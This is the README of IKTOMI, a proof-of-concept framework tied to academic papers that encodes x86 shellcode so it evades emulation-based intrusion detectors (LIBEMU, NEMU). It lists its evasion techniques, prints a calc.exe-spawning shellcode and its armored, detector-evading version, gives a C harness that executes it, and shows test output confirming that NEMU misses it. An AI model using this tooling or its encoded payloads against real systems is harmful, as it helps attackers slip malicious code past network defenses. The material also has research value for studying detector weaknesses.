# IKTOMI - EBNIDS Evasion Encoder

>Copyright (C) 2015 - Jos Wetzels.
>
>See the file 'LICENSE' for copying permission.

IKTOMI is a proof-of-concept implementation of the EBNIDS evasion modules as a shellcode encoding framework accompanying the papers ['On Emulation-Based Network Intrusion Detection Systems'](http://link.springer.com/chapter/10.1007%2F978-3-319-11379-1_19) and [APTs way: Evading Your EBNIDS](https://www.blackhat.com/docs/eu-14/materials/eu-14-Abbasi-APTs-Way-Evading-Your-EBNIDS-wp.pdf). The framework is intended to be relatively light-weight and can be used either as a standalone tool (via the [iktomi.py]() command-line interface) or as a loadable Python module for custom exploit or malicious executable payload armoring. While initially intended to be integrated into Metasploit Framework, some overhauls to MSFs internals as well as our desire to create a light-weight and standalone framework resulted in this proof-of-concept.

## Features

IKTOMI offers the following features:

* **Command-line**: An easy to use command-line interface which can be passed any shellcode which is subsequently encoded and armored according to specified parameters
* **Module**: The option to load the framework as a module for close and specific integration in custom projects
* **Sanity**: Integrated sanity-testing routines demonstrating the evasion of the targeted EBNIDS (LIBEMU or NEMU)
* **Evasion**: The ability to choose which target EBNIDS systems to evade (after which a randomized evader will be chosen) and to which depth (specifying the number of evasive layers). All evaders are lightly polymorphic, complicating easy signature-matching (future extensions will introduce better polymorphism)
* **Encoding**: A lightly-polymorphic XOR-based encoder to evade common signature-based IDS systems (future extensions will add more and better encoders)

In future releases we aim to introduce the following features:

* **Conflict-resolution**: Full conflict-resolution capabilities to automatically select the optimal encoder/evader order from either a user-specified or random selection
* **Hash-armoring**: Add a reliable, polymorphic version of the Hash-Armoring CKPE evasion technique
* **General-purpose evasion**: Add a general-purpose top-layer evader targeting a combination of EBNIDS-intrinsic limitations rather than specifics as done by individual modules
* **Strong encoder**: Add a cryptographically strong, fully polymorphic encoder

## Modules

### Encoders

1. [poly_dword_xor](): A lightly polymorphic XOR-based encoder

### Evaders

1. Pre-processing
	1. [evasion_antidisassembly](): An evader using anti-disassembly tricks

2. Emulator
	1. Faithful emulation limitations
		1. [faith_fpu](): An evader using FPU instructions not supported by the emulation engine
		2. [faith_mmx](): An evader using MMX instructions not supported by the emulation engine
		3. [faith_sse](): An evader using SSE instructions not supported by the emulation engine
		4. [faith_obsol](): An evader using 'obsolete' instructions not supported by the emulation engine

	2. Emulator detection
		1. [detect_libemu](): An evader using LIBEMU GP register initial state detection
		2. [detect_nemu_gp](): An evader using NEMU GP register initial state detection
		3. [detect_nemu_cpuid](): An evader using NEMU incomplete CPUID emulation detection
		4. [detect_timing](): An evader using emulator detection based on timing latency

	3. Timeout threshold
		1. [evasion_timeout_opaque_loop](): An evader using opaque loops to exceed the timeout threshold
		2. [evasion_timeout_intensive_loop](): An evader using computationally intensive instruction loops to exceed the timeout threshold
		3. [evasion_timeout_integrated_loop](): An evader using integrated key generation loops to exceed the timeout threshold
		4. [evasion_timeout_rda](): An evader using Random Decryption Algorithm (RDA) to exceed the timeout threshold

	4. Context-Keyed Payload Encoding (CKPE)
		1. [evasion_ckpe_ckpe](): An evader using context-keyed payload encoding (with protected GetPC stub unlike the MSF variant)

3. Heuristics
	1. GetPC heuristic evasion
		1. [getpc_stackscan](): An evader using a stack-scanning GetPC stub to evade the 'GetPC seeding instruction' heuristic
		2. [getpc_stackconstruct](): An evader using stack-construct shellcode to evade the 'GetPC seeding instruction' heuristic

	2. PRT heuristic evasion
		1. [prt_relocator](): An evader using code-relocation to evade the payload read threshold (PRT) heuristic
		2. [prt_stackconstructor](): An evader using stack-construct shellcode to evade the payload read threshold (PRT) heuristic

	3. WX threshold heuristic evasion
		1. [wx_dualmap](): An evader using dual-mapping to evade the write-execute (WX) threshold

	4. Egghunting detection heuristic evasion
		1. [egghunt_api](): An evader using API-based egghunting to evade the various egghunting heuritics of NEMU

	5. Kernel32.dll base address resolution heuristic evasion
		1. [payload_kernel32_seh_walker](): An evader using SEH-chain walking to resolve the kernel32.dll base address
		2. [payload_kernel32_stackframe_walker](): An evader using stack-frame walking to resolve the kernel32.dll base address

## Installation

### Dependencies

* The [miasm](https://github.com/cea-sec/miasm) reverse-engineering framework
* The [pylibemu](https://github.com/buffer/pylibemu) python bindings for libemu
* The [nemu]() framework (which might be obtained by contacting the [author](http://www3.cs.stonybrook.edu/~mikepo/))

Install the above dependencies by following their respective instructions and test each of them individually to make sure they were installed correctly before proceeding with the framework.

### Setting up the framework

Clone this git repository into a new directory and perform the sanity tests to make sure it works (ignore the miasm warnings)

```bash
$ python iktomi.py --sanity full --shellcode 0
[*]Full sanity test:
[>]Shellcode payload: NEMU sanity test Download & Execute reflective DLL Injection (connect-back) payload from MSF
[>]Armor evaders: All except kernel32.dll heuristic evasion
[Press any key to continue]
(...)
[*]Testing against shellcode encoded with [emu.timeout.intensive_loop]
[*]Testing against shellcode encoded with [emu.timeout.integrated_loop]
[*]Testing against shellcode encoded with [emu.ckpe.ckpe]
[+]Finished NEMU sanity check!
[+]LIBEMU evasion success rate: 100.000000%
[+]NEMU evasion success rate: 84.210526%
[+]Test successful!
```

Note that the above NEMU evasion rate is against **all** evaders (including those that only seek to evade LIBEMU) and hence reflects NEMU's ability to detect those shellcodes armored with LIBEMU evaders only.

```bash
python iktomi.py --sanity kernel32 --shellcode 0
[*]Kernel32.dll base address resolution heuristic evasion sanity test:
[>]Shellcode payload: Universal Windows x86 calc.exe spawn by SkyLined & PFerrie
[>]Base heuristic evaders: seh walking, stack-frame walking
[>]Armor evaders: Randomly selected for target EBNIDs
[Press any key to continue]
(...)
[*]Testing against shellcode encoded with [peb.evade_nemu.[emu.detect.nemu_cpuid]]
[*]Testing against shellcode encoded with [seh.evade_nemu.[emu.detect.nemu_gp]]
[*]Testing against shellcode encoded with [stack_frame.evade_nemu.[emu.faith.sse]]
[+]Finished NEMU sanity check!
[+]LIBEMU evasion success rate: 100.000000%
[+]NEMU evasion success rate: 100.000000%
[+]Test successful!
```

## Example usage

The standalone tool offers the following options:

```bash
:IKTOMI.IKTOMI.IKTOMI.IKTOMI.IKTOMI.IKTOMI:
 ___________$___________$
_____$____$$___________$$____$
____$$____$$____________$$___$$
____$$___$$_____________$$____$
___$$____$$____$___$____$$____$$
___$$____$$____$$$$$____$$____$$
___$$___$$$___$$$$$$$___$$$___$$
__$$$___$$$___$$$$$$$___$$$___$$$
__$$$___$$$___$$$$$$$___$$$___$$$
__$$$___$$$____$$$$$____$$$___$$$
__$$$____$$$___$$$$$___$$$___$$$$
___$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
__________$$$$$$$$$$$$$$
___________$$$$$$$$$$$$
_____$$$$$$$$$$$$$$$$$$$$$$$$$
_$$$$$$$$$$_$$$$$$$$$$$_$$$$$$$$$$
$$$$___$$$__$$$$$$$$$$$__$$$___$$$$
$$$____$$$__$$$$$$$$$$$__$$$____$$$
_$$$___$$$__$$$$$$$$$$$__$$$___$$$
_$$$___$$$__$$$$$$$$$$$__$$$___$$$
__$$____$$___$$$$$$$$$___$$____$$
__$$$___$$___$$$$$$$$$___$$___$$$
___$$____$$___$$$$$$$___$$____$$
____$$____$____$$$$$____$____$$
_____$_____$___________$_____$
______$____$___________$____$

EBNIDS Evasion Encoder
Copyright (C) 2015 - Jos Wetzels.

[-]Error: argument --shellcode is required

usage: iktomi.py [-h] --shellcode SHELLCODE
                 [--evade {libemu,nemu} [{libemu,nemu} ...]] [--depth DEPTH]
                 [--encoders {x86.poly_dword_xor} [{x86.poly_dword_xor} ...]]
                 [--no-auto_resolve] [--sanity {full,kernel32}] [--arch {x86}]
                 [--bits {32}] [--badchars BADCHARS]
                 [--format {hex,c,asm,python}]

optional arguments:
  -h, --help            show this help message and exit
  --shellcode SHELLCODE
                        shellcode (in hex format)
  --evade {libemu,nemu} [{libemu,nemu} ...]
                        list of target EBNIDSes to evade
  --depth DEPTH         number of evaders to chain per target EBNIDS (default:
                        1)
  --encoders {x86.poly_dword_xor} [{x86.poly_dword_xor} ...]
                        list of encoders to be (randomly) chosen from
  --no-auto_resolve     keep user specified evasion chain order (default:
                        auto-resolve)
  --sanity {full,kernel32}
                        sanity test
  --arch {x86}          architecture (default: x86)
  --bits {32}           bits (default: 32)
  --badchars BADCHARS   badchars (in hex format eg. 000a)
  --format {hex,c,asm,python}
                        output format
```

Consider the [following](https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html) generic calc.exe popping windows shellcode:

```c
char* shellcode =
"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
"\x45\x81\x3e\x43\x72\x65\x61\x75"
"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
"\x6c\x63\x89\xe2\x52\x52\x53\x53"
"\x53\x53\x53\x53\x52\x53\xff\xd7";
```

As we can see in the source this shellcode uses the PEB to resolve the kernel32.dll base address:

```asm
;================================
;Find Kernel32 Base
;================================
mov edi, [fs:ebx+0x30]
mov edi, [edi+0x0c]
mov edi, [edi+0x1c]

module_loop:
mov eax, [edi+0x08]
mov esi, [edi+0x20]
mov edi, [edi]
cmp byte [esi+12], '3'
jne module_loop
```

Which will trigger NEMU's heuristics. Given the following NEMU test on the above shellcode:

```python
from arch.core import architectures
from testing_modules.nemu_tester.nemu_tester import nemu_evasion_test

shellcode = "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"

nemu_test = nemu_evasion_test(architectures['x86'], 32)
status, starting_pos, shellcode_type, decrypted_shellcode = nemu_test.test(shellcode)

if(status):
	print "[!]Detected shellcode of type [%s] at offset [%d]" % (shellcode_type, starting_pos)
else:
	print "[+]No shellcode detected"
```

If we run it we will get:

```bash
$ ./nemu_test.py
0  60000000 31DB               xor ebx,ebx                     ebx 00000000
1  60000002 648B7B30         * mov edi,fs:[ebx+0x30]           edi 7FFD7000 [7FFDF030] .p..
2  60000006 8B7F0C           * mov edi,[edi+0xc]               edi 00241EA0 [7FFD700C] ..$.
3  60000009 8B7F1C           * mov edi,[edi+0x1c]              edi 00241F58 [00241EBC] X.$.
(...)  
1016  6000005b E2FD            214 loop 0x6000005a                 ecx 00000028
1017  6000005a 53                 push ebx                        esp 60021F3A
1018  6000005b E2FD            215 loop 0x6000005a                 ecx 00000027
1019  6000005a 53                 push ebx                        esp 60021F36
1020  6000005b E2FD            216 loop 0x6000005a                 ecx 00000026
1021  6000005a 53                 push ebx                        esp 60021F32
1022  6000005b E2FD            217 loop 0x6000005a                 ecx 00000025
1023  6000005a 53                 push ebx                        esp 60021F2E
      Reached execution threshold
END   execution trace: 1024 instructions, 0 payload reads, 0 unique
[!]Detected shellcode of type [[PEB kernel32.dll] ] at offset [0]
```

In order to evade NEMU we will use the standalone tool to armor our shellcode:

```bash
$ python iktomi.py --evade nemu --depth 1 --encoders x86.poly_dword_xor --format c --shellcode 31db648b7b308b7f0c8b7f1c8b47088b77208b3f807e0c3375f289c703783c8b577801c28b7a2001c789dd8b34af01c645813e4372656175f2817e086f63657375e98b7a2401c7668b2c6f8b7a1c01c78b7caffc01c789d9b1ff53e2fd6863616c6389e252525353535353535253ffd7
[+]Selected Evader chain order: [emu.detect.timing]
WARNING: dynamic dst ExprId('EDI', 32)
[2015-07-23 10:53:03] dynamic dst ExprId('EDI', 32)
WARNING: dynamic dst ExprId('EDI', 32)
[2015-07-23 10:53:03] dynamic dst ExprId('EDI', 32)
WARNING: dynamic dst ExprId('EDI', 32)
[2015-07-23 10:53:03] dynamic dst ExprId('EDI', 32)
[+]Armored shellcode: 
unsigned char* shellcode = "\x31\xC9\x83\xE9\xFE\x51\x0F\xA2\x0F\x31\x8B\x0C\xE4\x50\x83\xF9\x02\x72\x0D\x31\xC9\x81\xE9\x01\xFF\xFF\xFF\x90\xE2\xFD\xEB\x0F\x31\xC9\x81\xE9\x01\xFF\xFF\xFF\x8D\x04\x08\xF7\xE9\xE2\xF9\x0F\x01\xF9\x50\x0F\xA2\x58\x5A\x29\xD0\xC1\xE8\x08\x59\x83\xF9\x02\x0F\x44\xF0\x0F\x45\xF8\x49\x85\xC9\x75\xBA\x29\xD2\x89\xF8\xF7\xFE\x68\x5B\x53\xC3\x1E\x83\xF8\x06\x0F\x4E\xFC\xFF\xD7\xBF\x51\x30\x7D\xEE\x83\xEB\xEC\x31\xC9\x83\xE9\xE4\x31\x3B\x83\xEB\xFC\xE2\xF9\x60\xEB\x19\x65\x2A\x00\xF6\x91\x5D\xBB\x02\xF2\xDA\x77\x75\x65\x26\x10\xF6\xD1\xD1\x4E\x71\xDD\x24\xC2\xF4\x29\x52\x48\x41\x65\x06\x48\x7C\x2C\xDA\x4A\x5D\xEF\x96\xB9\xA0\x65\x65\x9F\x7C\x28\x14\xB1\x43\xAD\x23\x55\x1C\x9B\xA3\xB1\x03\xE6\x3E\x53\x18\x9D\x24\xD9\xF6\x94\x75\x31\xBA\x88\xDA\x1C\x12\x65\x2B\x2C\x7C\x29\xDA\x4C\xD2\x12\x50\xF7\xF4\x37\xE0\xCF\x2E\x0C\xAC\x58\x1E\x8F\x3D\x53\xF4\x0C\x03\x62\x2E\xBD\x02\x63\x2E\xBD\x03\x63\x82\x39"
```

We can then run the armored payload in a dummy shellcode executer to see it works:

```c
#include <stdio.h>

int main(int ac, unsigned char**av)
{
    //Armored shellcode
    unsigned char* shellcode = "\x31\xC9\x83\xE9\xFE\x51\x0F\xA2\x0F\x31\x8B\x0C\xE4\x50\x83\xF9\x02\x72\x0D\x31\xC9\x81\xE9\x01\xFF\xFF\xFF\x90\xE2\xFD\xEB\x0F\x31\xC9\x81\xE9\x01\xFF\xFF\xFF\x8D\x04\x08\xF7\xE9\xE2\xF9\x0F\x01\xF9\x50\x0F\xA2\x58\x5A\x29\xD0\xC1\xE8\x08\x59\x83\xF9\x02\x0F\x44\xF0\x0F\x45\xF8\x49\x85\xC9\x75\xBA\x29\xD2\x89\xF8\xF7\xFE\x68\x5B\x53\xC3\x1E\x83\xF8\x06\x0F\x4E\xFC\xFF\xD7\xBF\x51\x30\x7D\xEE\x83\xEB\xEC\x31\xC9\x83\xE9\xE4\x31\x3B\x83\xEB\xFC\xE2\xF9\x60\xEB\x19\x65\x2A\x00\xF6\x91\x5D\xBB\x02\xF2\xDA\x77\x75\x65\x26\x10\xF6\xD1\xD1\x4E\x71\xDD\x24\xC2\xF4\x29\x52\x48\x41\x65\x06\x48\x7C\x2C\xDA\x4A\x5D\xEF\x96\xB9\xA0\x65\x65\x9F\x7C\x28\x14\xB1\x43\xAD\x23\x55\x1C\x9B\xA3\xB1\x03\xE6\x3E\x53\x18\x9D\x24\xD9\xF6\x94\x75\x31\xBA\x88\xDA\x1C\x12\x65\x2B\x2C\x7C\x29\xDA\x4C\xD2\x12\x50\xF7\xF4\x37\xE0\xCF\x2E\x0C\xAC\x58\x1E\x8F\x3D\x53\xF4\x0C\x03\x62\x2E\xBD\x02\x63\x2E\xBD\x03\x63\x82\x39";
    //Shellcode needs to be in write+exec area
    unsigned char* buf = (unsigned char*)malloc(1024);
    memcpy(buf, shellcode, 226);

    //Execute shellcode
    int (*f)();
    f = (int (*)())buf;
    (int)(*f)();
	return 0;
}
```

And running this armored shellcode in the NEMU test above shows it is now undetected:

```bash
$ ./nemu_test.py
[+]No shellcode detected
```

## Limitations & Notes

This release is to be considered a very early alpha and as such includes several limitations (which we will seek to address over time) and possibly some bugs as well (which we will seek to address as we or other people run into them and report them).

### Limitations

* **Badchars**: There is no consistent support for so-called 'bad characters' at the moment even though the occurance of the most common (null bytes) has been kept to a minimum. This will be added in future releases.
* **x86-32**: The framework currently only supports the x86-32 platform, support for additional platforms (such as x86-64) will be the goal of future releases
* **ASLR**: Certain evaders (those relying on the API db: egghunting, dualmapping and relaction) will currently not work on ASLR-enabled systems but can be modified to use dynamic function resolution at the price of increased codesize.
* **API db dummy**: The current API db is a dummy stub supporting only Windows 7 Ultimate but a tool for filling it with target system specifics will be added in future releases

### Notes

* The kernel32.dll base address resolution heuristic evaders are to be used as part of the shellcode payload and not an encoder. An example of their usage is provided in [calc_shellcode.py](calc_shellcode.py)
